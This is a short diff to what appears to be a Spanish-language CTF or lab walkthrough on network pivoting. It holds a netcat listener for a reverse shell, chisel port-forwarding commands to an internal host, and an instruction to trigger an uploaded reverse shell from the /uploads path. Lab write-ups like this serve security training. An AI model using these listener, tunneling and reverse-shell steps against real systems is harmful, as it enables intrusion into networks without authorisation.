@@ -427,7 +427,7 @@ nc -lvnp 1234
 ./chisel client 10.10.10.1:8000 1234:127.0.0.1:1234
 
 # Inclusion
-./chisel client 20.20.20.2:9000 R:20.20.20.2:1081:socks 1234:127.0.0.1:1234
+./chisel client 20.20.20.2:9000 1234:127.0.0.1:1234
 ```
  Ahora vamos a la ruta /uploads y clicamos sobre la reverse shell para que se ejecute:
  <img width="1309" height="378" alt="imagen" src="https://github.com/user-attachments/assets/499ec3e2-e9f7-4f79-ab32-20808fb5958b" />
